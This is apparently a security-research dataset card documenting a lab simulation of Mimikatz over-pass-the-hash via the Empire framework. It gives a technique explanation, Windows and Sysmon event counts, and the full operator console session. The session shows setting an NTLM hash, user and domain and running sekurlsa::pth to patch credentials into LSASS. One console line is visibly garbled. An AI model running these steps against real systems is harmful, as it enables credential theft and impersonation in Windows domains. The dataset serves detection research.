
# Empire Mimikatz Over-Pass-The-Hash

When sekurlsa::pth is used to over-pass-the-hash, Mimikatz first creates a new logon type 9 process with dummy credentials - this creates a new "sacrificial" logon session that doesn't interact with the current logon session. It then opens the LSASS process with the ability to write to process memory, and the supplied hash/key is then patched into the appropriate section for the associated logon session (in this case, the "sacrificial" logon session that was started). This causes the normal Kerberos authentication process to kick off as normal as if the user had normally logged on, turning the supplied hash into a fully-fledged TGT.

## Technique(s) ID

T1097

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## dataset

[empire_mimikatz_opth.tar.gz](./empire_rmimikatz_opth.tar.gz)

## Nnetwork Environment

Shire

## Time Taken

2019-03-19131123

## About this file

| log_name                                 | task                                                   |   record_number |
|------------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                       | Pipeline Execution Details                             |            2093 |
| Windows PowerShell                       | Provider Lifecycle                                     |               8 |
| Windows PowerShell                       | Engine Lifecycle                                       |               1 |
| Security                                 | Filtering Platform Connection                          |             286 |
| Security                                 | Token Right Adjusted Events                            |              96 |
| Security                                 | User Account Management                                |              23 |
| Security                                 | Sensitive Privilege Use                                |              12 |
| Security                                 | Detailed File Share                                    |              10 |
| Security                                 | Group Membership                                       |              10 |
| Security                                 | Logon                                                  |              10 |
| Security                                 | Special Logon                                          |              10 |
| Security                                 | Logoff                                                 |               9 |
| Security                                 | Process Creation                                       |               6 |
| Security                                 | Process Termination                                    |               3 |
| Security                                 | Authorization Policy Change                            |               1 |
| Security                                 | File Share                                             |               1 |
| Security                                 | Kerberos Service Ticket Operations                     |               1 |
| Security                                 | Other Object Access Events                             |               1 |
| Security                                 | Security System Extension                              |               1 |
| Microsoft-Windows-Sysmon/Operational     | Image loaded (rule: ImageLoad)                         |             265 |
| Microsoft-Windows-Sysmon/Operational     | Process accessed (rule: ProcessAccess)                 |             221 |
| Microsoft-Windows-Sysmon/Operational     | Network connection detected (rule: NetworkConnect)     |             137 |
| Microsoft-Windows-Sysmon/Operational     | Registry object added or deleted (rule: RegistryEvent) |              85 |
| Microsoft-Windows-Sysmon/Operational     | Pipe Connected (rule: PipeEvent)                       |              26 |
| Microsoft-Windows-Sysmon/Operational     | File created (rule: FileCreate)                        |              16 |
| Microsoft-Windows-Sysmon/Operational     | RawAccessRead detected (rule: RawAccessRead)           |              14 |
| Microsoft-Windows-Sysmon/Operational     | Registry value set (rule: RegistryEvent)               |              11 |
| Microsoft-Windows-Sysmon/Operational     | Process Create (rule: ProcessCreate)                   |               7 |
| Microsoft-Windows-Sysmon/Operational     | Pipe Created (rule: PipeEvent)                         |               2 |
| Microsoft-Windows-PowerShell/Operational | Executing Pipeline                                     |            2051 |

## Empire Activity

```
(Empire: 8BLV6USC) > usemodule credentials/mimikatz/pth*
(Empire: powershell/credentials/mimikatz/pth) > info

              Name: Invoke-Mimikatz PTH
            Module: powershell/credentials/mimikatz/pth
        NeedsAdmin: True
         OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
   OutputExtension: None

Authors:
  @JosephBialek
  @gentilkiwi

Description:
  Runs PowerSploit's Invoke-Mimikatz function to execute
  sekurlsa::pth to create a new process. with a specific
  user's hash. Use credentials/tokens to steal the token
  afterwards.

Comments:
  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com
  http://blog.cobaltstrike.com/2015/05/21/how-to-pass-the-
  hash-with-mimikatz/

Options:

  Name   Required    Value                     Description
  ----   --------    -------                   -----------
  CredID False                                 CredID from the store to use for ticket 
                                               creation.                               
  domain False                                 The fully qualified domain name.        
  ntlm   False                                 The NTLM hash to use.                   
  user   False                                 Username to impersonate.                
  Agent  True        8BLV6USC                  Agent to run module on.                 

4f81f8c89a2a384f4a68credentials/mimikatz/pth) > set ntlm b415baa073a1 
(Empire: powershell/credentials/mimikatz/pth) > set user Mmidge
(Empire: powershell/credentials/mimikatz/pth) > set domain shire.com
(Empire: powershell/credentials/mimikatz/pth) > execute
[*] Tasked 8BLV6USC to run TASK_CMD_JOB
[*] Agent 8BLV6USC tasked with task ID 3
[*] Tasked agent 8BLV6USC to run module powershell/credentials/mimikatz/pth
(Empire: powershell/credentials/mimikatz/pth) > Job started: 6DH2RP
Hostname: IT001.shire.com / S-1-5-21-2511471446-1103646877-3980648787

  .#####.   mimikatz 2.1.1 (x64) #17763 Feb 23 2019 12:03:02
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::pth /user:Mmidge /domain:shire.com /ntlm:b415baa073a14f81f8c89a2a384f4a68
user	: Mmidge
domain	: shire.com
program	: cmd.exe
impers.	: no
NTLM	: b415baa073a14f81f8c89a2a384f4a68
  |  PID  7920
  |  TID  8308
  |  LSA Process is now R/W
  |  LUID 0 ; 85924706 (00000000:051f1b62)
  \_ msv1_0   - data copy @ 000001BD859AEBA0 : OK !
  \_ kerberos - data copy @ 000001BD85999068
   \_ aes256_hmac       -> null             
   \_ aes128_hmac       -> null             
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001BD85902A78 (32) -> null


Use credentials/token to steal the token of the created PID.


(Empire: powershell/credentials/mimikatz/pth) >
```
